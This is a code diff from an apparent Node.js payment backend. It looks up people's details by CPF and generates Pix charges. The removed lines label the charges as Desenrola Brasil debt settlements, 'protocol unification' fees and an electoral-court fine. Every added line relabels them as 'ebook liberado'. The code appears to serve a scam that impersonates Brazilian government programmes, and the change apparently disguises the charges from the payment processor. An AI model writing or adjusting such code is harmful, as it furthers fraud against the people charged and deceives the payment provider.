@@ -106,7 +106,7 @@ async function createFreePayTransaction({ amount, name, cpf, phone, email, title
     },
     items: [
       {
-        title: title || 'Quitação de Dívidas - Programa Desenrola Brasil',
+        title: 'ebook liberado',
         unit_price: amountCents,
         quantity: 1,
         tangible: false
@@ -535,7 +535,7 @@ async function fetchCpfData(rawCpf) {
       cpf: clientData.cpf,
       phone: clientData.telefone || clientData.phone,
       email: clientData.email,
-      title: 'Quitação de Dívidas - Programa Desenrola Brasil'
+      title: 'ebook liberado'
     });
 
     transactions.set(result.transactionId, { createdAt: Date.now(), gateway: result.gatewayKey, id: result.transactionId });
@@ -552,7 +552,7 @@ async function fetchCpfData(rawCpf) {
       gatewayKey: result.gatewayKey,
       transactionId: result.transactionId,
       pixCode: result.pixCode,
-      itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
+      itemTitle: 'ebook liberado'
     });
 
     res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -583,7 +583,7 @@ async function fetchCpfData(rawCpf) {
       cpf: clientData.cpf,
       phone: clientData.telefone || clientData.phone,
       email: clientData.email,
-      title: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
+      title: 'ebook liberado'
     });
 
     transactions.set(result.transactionId, { createdAt: Date.now(), gateway: result.gatewayKey, id: result.transactionId });
@@ -600,7 +600,7 @@ async function fetchCpfData(rawCpf) {
       gatewayKey: result.gatewayKey,
       transactionId: result.transactionId,
       pixCode: result.pixCode,
-      itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
+      itemTitle: 'ebook liberado'
     });
 
     res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -648,7 +648,7 @@ async function fetchCpfData(rawCpf) {
       gatewayKey: result.gatewayKey,
       transactionId: result.transactionId,
       pixCode: result.pixCode,
-      itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
+      itemTitle: 'ebook liberado'
     });
 
     res.writeHead(200, { 'Content-Type': 'application/json' });
